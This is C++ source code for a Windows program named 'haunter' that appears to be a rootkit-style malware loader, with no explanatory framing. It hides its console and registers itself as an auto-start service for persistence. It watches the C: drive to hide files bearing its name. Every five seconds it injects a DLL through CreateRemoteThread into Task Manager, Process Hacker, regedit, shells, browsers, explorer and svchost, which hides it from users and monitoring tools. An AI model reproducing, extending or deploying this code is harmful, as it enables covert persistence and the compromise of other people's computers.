#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

using namespace std;

void InstallService() {
    wchar_t szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
        return;
    }

    wstring servicePath = wstring(szPath) + L" -service";
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        return;
    }

    SC_HANDLE schService = CreateService(
        schSCManager,
        L"haunter",
        L"haunter_srvs",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        servicePath.c_str(),
        NULL,
        NULL,
        NULL,
        NULL,
        NULL);

    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

DWORD GetProcessIdByName(const wstring& processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processId;
}

int InjectDll(DWORD processId, const wstring& dllPath) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        return -1;
    }

    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (loadLibraryAddress == NULL) {
        CloseHandle(processHandle);
        return -2;
    }

    size_t pathLength = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE);
    if (remoteDllPath == NULL) {
        CloseHandle(processHandle);
        return -3;
    }

    if (!WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), pathLength, NULL)) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -4;
    }

    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL);
    if (threadHandle == NULL) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -5;
    }

    WaitForSingleObject(threadHandle, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(threadHandle, &exitCode);

    CloseHandle(threadHandle);
    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return exitCode;
}

void SetHiddenAttribute(LPCWSTR path) {
    DWORD attributes = GetFileAttributesW(path);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    if (!(attributes & FILE_ATTRIBUTE_HIDDEN)) {
        SetFileAttributesW(path, attributes | FILE_ATTRIBUTE_HIDDEN);
    }
}

void MonitorDirectory(LPCWSTR path) {
    HANDLE hDir = CreateFile(
        path,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hDir == INVALID_HANDLE_VALUE) {
        return;
    }

    char buffer[1024];
    DWORD bytesReturned;
    while (true) {
        if (ReadDirectoryChangesW(
            hDir,
            &buffer,
            sizeof(buffer),
            TRUE,
            FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME,
            &bytesReturned,
            NULL,
            NULL
        ) == FALSE) {
            break;
        }

        FILE_NOTIFY_INFORMATION* pNotify;
        int offset = 0;
        do {
            pNotify = (FILE_NOTIFY_INFORMATION*)((char*)buffer + offset);
            WCHAR fileName[MAX_PATH];
            wcsncpy_s(fileName, MAX_PATH, pNotify->FileName, pNotify->FileNameLength / sizeof(WCHAR));
            fileName[pNotify->FileNameLength / sizeof(WCHAR)] = L'\0';

            if (wcsstr(fileName, L"haunter") != NULL) {
                WCHAR fullPath[MAX_PATH];
                wcscpy_s(fullPath, MAX_PATH, path);
                wcscat_s(fullPath, MAX_PATH, fileName);
                SetHiddenAttribute(fullPath);
 
            }

            offset += pNotify->NextEntryOffset;
        } while (pNotify->NextEntryOffset != 0);
    }

    CloseHandle(hDir);
}

DWORD WINAPI ThreadFunc(void* data) {
    LPCWSTR directoryToMonitor = (LPCWSTR)data;
    MonitorDirectory(directoryToMonitor);
    return 0;
}

int main() {
    FreeConsole();

    LPCWSTR directoryToMonitor = L"C:\\";
    HANDLE thread = CreateThread(NULL, 0, ThreadFunc, (void*)directoryToMonitor, 0, NULL);
    if (thread) {
        InstallService();
        wchar_t currentDir[MAX_PATH];
        GetModuleFileName(NULL, currentDir, MAX_PATH);
        wstring currentDirStr(currentDir);
        wstring::size_type pos = currentDirStr.find_last_of(L"\\/");
        if (pos == wstring::npos) {
            return -1;
        }
        wstring exeDir = currentDirStr.substr(0, pos + 1);

        wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe", L"mmc.exe", L"powershell.exe", L"cmd.exe", L"msedge.exe", L"chrome.exe", L"regedit.exe", L"svchost.exe" };
        const int numExes = sizeof(exeNames) / sizeof(wstring);

        wstring dllPath = exeDir + L"haunter_src.dll";

        while (true) {
            PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };

            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snapshot == INVALID_HANDLE_VALUE) {
                return -1;
            }

            if (!Process32First(snapshot, &processEntry)) {
                CloseHandle(snapshot);
                return -1;
            }

            do {
                for (int i = 0; i < numExes; i++) {
                    if (_wcsicmp(processEntry.szExeFile, exeNames[i].c_str()) == 0) {
                        DWORD processId = processEntry.th32ProcessID;
                        InjectDll(processId, dllPath);
                    }
                }
            } while (Process32Next(snapshot, &processEntry));

            CloseHandle(snapshot);

            Sleep(5000);
        }
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
    }
    return 0;
}
